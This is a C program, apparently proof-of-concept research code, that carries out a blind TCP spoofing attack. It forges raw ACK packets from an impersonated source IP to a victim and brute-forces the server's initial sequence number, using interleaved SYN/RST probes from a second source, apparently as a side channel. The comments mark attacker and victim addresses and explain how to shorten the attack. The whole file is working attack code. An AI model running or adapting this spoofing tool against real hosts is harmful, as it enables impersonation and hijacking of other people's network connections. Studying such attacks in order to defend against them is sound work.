// #include "include/socketManager.h"
// #include "include/packetForger.h"
// #include "include/str_replace.h"
#include "../include/socketManager.h"
#include "../include/packetForger.h"
#include "../include/str_replace.h"
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <stdbool.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>

int main(int argc, char **argv) {


    time_t mytime = time(NULL);
    char * time_str = ctime(&mytime);
    time_str[strlen(time_str)-1] = '\0';
    printf("Current Time : %s\n", time_str);

    char *srcip1 = "src"; // attacker impersonated source IP
    char *dstip1 = "dst"; // victim
    int src_port1 = 12345;
    char *srcip2 = "src"; // attacker probing source IP
    char *dstip2 = "dst"; // victim
    int src_port2 = 60020;

    int seq = 1;
    char s_ack[16];

    u_int32_t ack_number = 13338;
    // This number is the first ack number to be tried by the bruteforcing
    // the script would increase the ack_number linerally
    // The TCP spoofing can take long before succeding, one can update the starting ack_number to be close to 
    // the correct server ISN to shorten the spoofing time.

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    // fcntl(sock, F_SETFL, O_NONBLOCK);

    int one = 1;
    const int *val = &one;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0){
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
	    exit(0);
    }

    char *payload="";
    while(true){
        rawsocket_send(sock, build_tcp_packet(src_port1, 8000, srcip1, dstip1, seq, ack_number, 512, ACK, payload));

        rawsocket_send(sock, build_tcp_packet(src_port2, 8000, srcip2, dstip2, ack_number, ack_number,512,SYN,payload)); // SYN
        rawsocket_send(sock, build_tcp_packet(src_port2, 8000, srcip2, dstip2, ack_number+1, ack_number+1,512,RST,payload)); // RST
        rawsocket_send(sock, build_tcp_packet(src_port2, 8000, srcip2, dstip2, ack_number, ack_number,512,SYN,payload)); // SYN
        rawsocket_send(sock, build_tcp_packet(src_port2, 8000, srcip2, dstip2, ack_number+1, ack_number+1,512,RST,payload)); // RST
        
        // ack_number = ack_number + 13337; 
        ack_number = ack_number + 1; 
    }
}

